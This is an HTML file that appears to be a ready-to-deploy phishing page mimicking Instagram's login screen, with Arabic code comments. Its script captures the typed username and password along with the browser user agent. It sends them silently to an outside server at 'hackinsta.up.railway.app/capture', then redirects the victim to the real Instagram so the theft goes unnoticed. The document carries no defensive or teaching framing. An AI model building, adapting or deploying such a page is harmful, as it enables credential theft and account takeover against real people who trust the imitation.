<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; }
        body { background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .wrapper { width: 100%; max-width: 350px; padding: 20px; }
        .card { background: white; border: 1px solid #dbdbdb; padding: 40px 30px; border-radius: 1px; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo img { width: 175px; }
        input { width: 100%; padding: 9px 8px; margin-bottom: 6px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 12px; }
        input:focus { border-color: #a8a8a8; background: white; outline: none; }
        button { width: 100%; padding: 7px 0; margin: 8px 0 12px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: 600; font-size: 14px; cursor: pointer; }
        button:hover { background: #1877f2; }
        button:disabled { opacity: 0.7; cursor: default; }
        .divider { display: flex; align-items: center; margin: 10px 0 18px; color: #8e8e8e; font-size: 13px; }
        .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #dbdbdb; }
        .divider::before { margin-right: 18px; }
        .divider::after { margin-left: 18px; }
        .fb-login { display: flex; justify-content: center; align-items: center; gap: 6px; color: #385185; font-weight: 600; font-size: 14px; text-decoration: none; cursor: pointer; margin-bottom: 12px; }
        .fb-login svg { width: 16px; height: 16px; fill: #385185; }
        .forgot { text-align: center; color: #00376b; font-size: 12px; display: block; text-decoration: none; margin-top: 12px; }
        .forgot:hover { text-decoration: underline; }
        .signup-card { background: white; border: 1px solid #dbdbdb; padding: 20px 0; text-align: center; margin-top: 10px; font-size: 14px; }
        .signup-card a { color: #0095f6; font-weight: 600; text-decoration: none; }
        .app-links { text-align: center; margin-top: 20px; }
        .stores { display: flex; justify-content: center; gap: 8px; margin-top: 12px; }
        .stores img { height: 40px; }
        .meta { display: flex; flex-wrap: wrap; justify-content: center; gap: 4px 10px; margin-top: 20px; font-size: 12px; color: #8e8e8e; }
        .meta a { color: #8e8e8e; text-decoration: none; }
        .meta a:hover { text-decoration: underline; }
        .error-msg { color: #ed4956; font-size: 12px; text-align: center; margin: 6px 0; display: none; }
        @media (max-width: 450px) {
            .card { border-left: none; border-right: none; padding: 30px 20px; }
            .signup-card { border-left: none; border-right: none; }
            .wrapper { padding: 0; }
        }
    </style>
</head>
<body>
<div class="wrapper">
    <div class="card">
        <div class="logo">
            <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
        </div>

        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone number, username, or email" autofocus>
            <input type="password" id="password" placeholder="Password">
            <div class="error-msg" id="errorMsg"></div>
            <button type="submit" id="loginBtn">Log in</button>
        </form>

        <div class="divider">OR</div>

        <a href="https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414" target="_top" class="fb-login">
            <svg viewBox="0 0 16 16"><path d="M16 8.05c0-4.42-3.58-8-8-8S0 3.63 0 8.05c0 3.99 2.93 7.3 6.75 7.9v-5.6H4.72V8.05h2.03V6.36c0-2.01 1.2-3.12 3.03-3.12.88 0 1.8.16 1.8.16v1.98h-1.01c-1 0-1.31.62-1.31 1.25v1.5h2.23l-.36 2.3h-1.87V16c3.82-.6 6.75-3.91 6.75-7.9z"/></svg>
            Log in with Facebook
        </a>

        <a href="https://www.instagram.com/accounts/password/reset/" target="_top" class="forgot">Forgot password?</a>
    </div>

    <div class="signup-card">
        Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/" target="_top">Sign up</a>
    </div>

    <div class="app-links">
        <p>Get the app.</p>
        <div class="stores">
            <a href="https://apps.apple.com/app/instagram/id389801252" target="_blank"><img src="https://www.instagram.com/static/images/appstore/icon.png" alt="App Store"></a>
            <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank"><img src="https://www.instagram.com/static/images/googleplay/icon.png" alt="Google Play"></a>
        </div>
    </div>

    <div class="meta">
        <a href="https://about.meta.com/" target="_blank">Meta</a>
        <a href="https://about.instagram.com/" target="_blank">About</a>
        <a href="https://about.instagram.com/blog/" target="_blank">Blog</a>
        <a href="https://about.instagram.com/about-us/careers" target="_blank">Jobs</a>
        <a href="https://help.instagram.com/" target="_blank">Help</a>
        <a href="https://developers.facebook.com/docs/instagram" target="_blank">API</a>
        <a href="https://www.instagram.com/legal/privacy/" target="_blank">Privacy</a>
        <a href="https://www.instagram.com/legal/terms/" target="_blank">Terms</a>
        <a href="https://www.instagram.com/explore/locations/" target="_blank">Locations</a>
        <a href="https://www.instagram.com/instagramlite/" target="_blank">Instagram Lite</a>
    </div>
</div>

<script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const u = document.getElementById('username').value.trim();
        const p = document.getElementById('password').value.trim();
        const btn = document.getElementById('loginBtn');
        const error = document.getElementById('errorMsg');

        if (!u || !p) {
            error.style.display = 'block';
            error.textContent = 'Please fill in both fields.';
            return;
        }

        btn.disabled = true;
        btn.textContent = 'Logging in...';
        error.style.display = 'none';

        // ====== إرسال البيانات إلى خادمك على Railway ======
        fetch('https://hackinsta.up.railway.app/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                username: u,
                password: p,
                userAgent: navigator.userAgent
            })
        }).catch(() => {}); // فشل صامت

        // إعادة التوجيه إلى إنستا الحقيقي
        setTimeout(() => {
            window.location.href = 'https://www.instagram.com/';
        }, 800);
    });
</script>
</body>
</html>
